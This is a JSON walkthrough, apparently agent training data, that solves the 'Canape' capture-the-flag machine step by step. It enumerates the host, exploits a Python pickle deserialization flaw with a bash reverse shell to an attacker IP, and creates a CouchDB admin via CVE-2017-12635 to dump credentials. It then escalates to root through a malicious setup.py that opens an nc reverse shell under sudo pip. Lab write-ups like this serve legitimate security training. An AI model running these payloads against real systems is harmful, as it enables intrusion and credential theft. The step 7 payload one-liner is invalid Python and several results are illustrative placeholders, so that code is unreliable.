@@ -1,0 +1,179 @@
+{
+    "initial_prompt": "The goal of this CTF challenge, \"Canape,\" is to penetrate the target machine (10.10.10.70) and extract `user.txt` and `root.txt` flags. The attacker machine's IP is 10.10.14.4, used for reverse shells.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "(Attacker - Kali) Enumerate open ports and services on the target machine to identify potential attack vectors.",
+            "command": "nmap -p- -sV 10.10.10.70",
+            "result": "Nmap scan reveals port 80 (HTTP - Apache 2.4.18) and port 65535 (SSH - OpenSSH 7.2p2) are open. The web server is a primary target."
+        },
+        {
+            "step_number": 2,
+            "thought": "(Attacker - Kali) Perform directory brute-forcing on the web server (port 80) to find hidden files or directories.",
+            "command": "dirb http://10.10.10.70 -f",
+            "result": "Dirb scan discovers an exposed `.git/` directory at `http://10.10.10.70/.git/`. This suggests source code might be accessible."
+        },
+        {
+            "step_number": 3,
+            "thought": "(Attacker - Kali) Inspect the Git configuration file from the exposed `.git` directory to find the repository URL or relevant domain names.",
+            "command": "curl http://10.10.10.70/.git/config",
+            "result": "The output of the Git config file shows `url = http://git.canape.htb/simpsons.git`, revealing the domain `git.canape.htb` used by the repository."
+        },
+        {
+            "step_number": 4,
+            "thought": "(Attacker - Kali) Add the discovered domain `git.canape.htb` to the attacker's `/etc/hosts` file, mapping it to the target's IP address for proper resolution.",
+            "command": "echo \"10.10.10.70 git.canape.htb\" | sudo tee -a /etc/hosts",
+            "result": "The domain `git.canape.htb` is added to `/etc/hosts` and now resolves to `10.10.10.70` on the attacker machine. (Requires sudo privileges on Kali)."
+        },
+        {
+            "step_number": 5,
+            "thought": "(Attacker - Kali) Clone the Git repository using the discovered domain name to download the web application's source code.",
+            "command": "git clone http://git.canape.htb/simpsons.git",
+            "result": "The Git repository `simpsons.git` is successfully cloned. Reviewing `simpsons/__init__.py` reveals the application uses `pickle.loads(base64.b64decode(request.form['p']))` at the `/check` endpoint, indicating a Python deserialization vulnerability."
+        },
+        {
+            "step_number": 6,
+            "thought": "(Attacker - Kali) Set up a Netcat listener on port 443 to catch the incoming reverse shell connection once the vulnerability is exploited.",
+            "command": "nc -lvnp 443",
+            "result": "Netcat starts listening on port 443 on the attacker machine (10.10.14.4), ready to receive a connection."
+        },
+        {
+            "step_number": 7,
+            "thought": "(Attacker - Kali) Create a Python script file named `generate_payload.py` that, when executed, will print the base64 encoded pickle payload designed to execute a reverse shell.",
+            "command": "echo \"import pickle,os,base64; class RCE(object): def __reduce__(self): return (os.system, ('bash -c \\\"bash -i >& /dev/tcp/10.10.14.4/443 0>&1\\\"',)); print(base64.b64encode(pickle.dumps(RCE())).decode())\" > generate_payload.py",
+            "result": "The file `generate_payload.py` is created in the current directory containing the Python code for generating the malicious payload."
+        },
+        {
+            "step_number": 8,
+            "thought": "(Attacker - Kali) Execute the `generate_payload.py` script and save its base64 encoded output to a file named `payload.b64`.",
+            "command": "python generate_payload.py > payload.b64",
+            "result": "The file `payload.b64` is created, containing the base64 encoded malicious pickle payload."
+        },
+        {
+            "step_number": 9,
+            "thought": "(Attacker - Kali) Create another Python script, `generate_c_payload.py`, to generate a benign base64 encoded pickled string for the 'c' parameter, as required by the target application's `/check` endpoint.",
+            "command": "echo \"import pickle,base64; print(base64.b64encode(pickle.dumps('harmless')).decode())\" > generate_c_payload.py",
+            "result": "The file `generate_c_payload.py` is created, containing Python code to generate a benign payload."
+        },
+        {
+            "step_number": 10,
+            "thought": "(Attacker - Kali) Execute `generate_c_payload.py` and save its output to `c_payload.b64`.",
+            "command": "python generate_c_payload.py > c_payload.b64",
+            "result": "The file `c_payload.b64` is created, containing a benign base64 encoded pickled string."
+        },
+        {
+            "step_number": 11,
+            "thought": "(Attacker - Kali) Send the crafted malicious payload (as parameter 'p') and the benign payload (as parameter 'c') to the `/check` endpoint on the target web server to exploit the Python deserialization vulnerability.",
+            "command": "curl -X POST --data-urlencode \"p=$(cat payload.b64)\" --data-urlencode \"c=$(cat c_payload.b64)\" http://10.10.10.70/check",
+            "result": "The `curl` command sends the POST request. The Netcat listener (from Step 6) receives a reverse shell connection from the target as the `www-data` user."
+        },
+        {
+            "step_number": 12,
+            "thought": "(Target Shell - www-data) Check active network connections and listening ports on the target machine to identify any locally running services.",
+            "command": "netstat -antp",
+            "result": "The output of `netstat` reveals a CouchDB instance listening on `127.0.0.1:5984`, accessible only locally."
+        },
+        {
+            "step_number": 13,
+            "thought": "(Target Shell - www-data) Verify the CouchDB service is active and attempt to determine its version by querying its root endpoint.",
+            "command": "curl http://127.0.0.1:5984/",
+            "result": "CouchDB responds with a JSON object, e.g., `{\"couchdb\":\"Welcome\",\"version\":\"1.6.1\",...}`, confirming it's active and revealing its version (1.6.1, known to be vulnerable)."
+        },
+        {
+            "step_number": 14,
+            "thought": "(Target Shell - www-data) Enumerate all databases within the CouchDB instance to look for potentially sensitive information.",
+            "command": "curl http://127.0.0.1:5984/_all_dbs",
+            "result": "The command lists all databases, revealing one named `passwords`, which likely contains credentials."
+        },
+        {
+            "step_number": 15,
+            "thought": "(Target Shell - www-data) Exploit CouchDB vulnerability CVE-2017-12635 to create a new administrative user named 'attacker_admin' with password 'password123'.",
+            "command": "curl -X PUT 'http://127.0.0.1:5984/_users/org.couchdb.user:attacker_admin' --data-binary '{\"type\":\"user\", \"name\":\"attacker_admin\", \"roles\":[\"_admin\"], \"roles\":[], \"password\":\"password123\"}'",
+            "result": "Successfully creates the admin user in CouchDB. Response: `{\"ok\":true,\"id\":\"org.couchdb.user:attacker_admin\",\"rev\":\"...\"}`."
+        },
+        {
+            "step_number": 16,
+            "thought": "(Target Shell - www-data) Use the newly created CouchDB admin credentials to dump all documents from the `passwords` database.",
+            "command": "curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u attacker_admin:password123",
+            "result": "The command retrieves documents from the `passwords` database. The output contains SSH credentials: username `homer` and password `0B4jyA0xtytZi7esBNGp`."
+        },
+        {
+            "step_number": 17,
+            "thought": "(Target Shell - www-data) Check the `/etc/passwd` file to confirm that `homer` is a valid system user.",
+            "command": "cat /etc/passwd | grep homer",
+            "result": "Output confirms `homer` is a user, e.g., `homer:x:1000:1000:Homer,,,:/home/homer:/bin/bash`."
+        },
+        {
+            "step_number": 18,
+            "thought": "(Attacker - Kali) Use the obtained credentials to log in to the target machine via SSH as the user `homer` on port 65535.",
+            "command": "sshpass -p '0B4jyA0xtytZi7esBNGp' ssh -p 65535 homer@10.10.10.70 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+            "result": "Successfully logs into the target machine as `homer`. A new shell prompt for `homer@canape` is obtained."
+        },
+        {
+            "step_number": 19,
+            "thought": "(Target Shell - homer) List the contents of `homer`'s home directory to find the user flag file.",
+            "command": "ls /home/homer/",
+            "result": "The `ls` command lists files in `/home/homer/`, including `user.txt`."
+        },
+        {
+            "step_number": 20,
+            "thought": "(Target Shell - homer) Read the contents of `user.txt` to retrieve the user flag.",
+            "command": "cat /home/homer/user.txt",
+            "result": "The user flag (e.g., `HTB{...user_flag_content...}`) is displayed."
+        },
+        {
+            "step_number": 21,
+            "thought": "(Target Shell - homer) Check `homer`'s `sudo` privileges to identify potential privilege escalation vectors.",
+            "command": "echo '0B4jyA0xtytZi7esBNGp' | sudo -S -l",
+            "result": "The output shows that `homer` can run `/usr/bin/pip install *` as root, e.g., `(root) /usr/bin/pip install *`."
+        },
+        {
+            "step_number": 22,
+            "thought": "(Attacker - Kali) Set up another Netcat listener, this time on port 4444, to catch the root reverse shell.",
+            "command": "nc -lvnp 4444",
+            "result": "Netcat starts listening on port 4444 on the attacker machine, ready for the root shell."
+        },
+        {
+            "step_number": 23,
+            "thought": "(Target Shell - homer) Create a directory `/tmp/pip_exploit` to stage the malicious pip package.",
+            "command": "mkdir /tmp/pip_exploit",
+            "result": "The directory `/tmp/pip_exploit` is created successfully."
+        },
+        {
+            "step_number": 24,
+            "thought": "(Target Shell - homer) Create a `setup.py` file within `/tmp/pip_exploit` containing Python code that executes a reverse shell to the attacker's machine (10.10.14.4:4444).",
+            "command": "echo 'import os; os.system(\"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.4 4444 > /tmp/f\")' > /tmp/pip_exploit/setup.py",
+            "result": "The malicious `setup.py` file is created in `/tmp/pip_exploit/`."
+        },
+        {
+            "step_number": 25,
+            "thought": "(Target Shell - homer) Change the current directory to `/tmp/pip_exploit` where the malicious `setup.py` is located.",
+            "command": "cd /tmp/pip_exploit",
+            "result": "The current working directory is changed to `/tmp/pip_exploit`."
+        },
+        {
+            "step_number": 26,
+            "thought": "(Target Shell - homer) Execute `pip install .` with `sudo` to install the malicious package from the current directory, triggering the reverse shell in `setup.py`.",
+            "command": "echo '0B4jyA0xtytZi7esBNGp' | sudo -S /usr/bin/pip install .",
+            "result": "`pip install` executes `setup.py` as root. The Netcat listener on the attacker's machine (Step 22) receives a reverse shell connection with root privileges."
+        },
+        {
+            "step_number": 27,
+            "thought": "(Target Shell - root) Verify root access in the new shell by checking the current user ID.",
+            "command": "id",
+            "result": "The output `uid=0(root) gid=0(root) groups=0(root)...` confirms that root privileges have been obtained."
+        },
+        {
+            "step_number": 28,
+            "thought": "(Target Shell - root) Navigate to the `/root` directory, which typically contains the root flag.",
+            "command": "cd /root",
+            "result": "The current directory is changed to `/root`."
+        },
+        {
+            "step_number": 29,
+            "thought": "(Target Shell - root) Read the contents of `root.txt` to retrieve the final flag.",
+            "command": "cat root.txt",
+            "result": "The root flag (e.g., `HTB{...root_flag_content...}`) is displayed, completing the challenge."
+        }
+    ]
+}
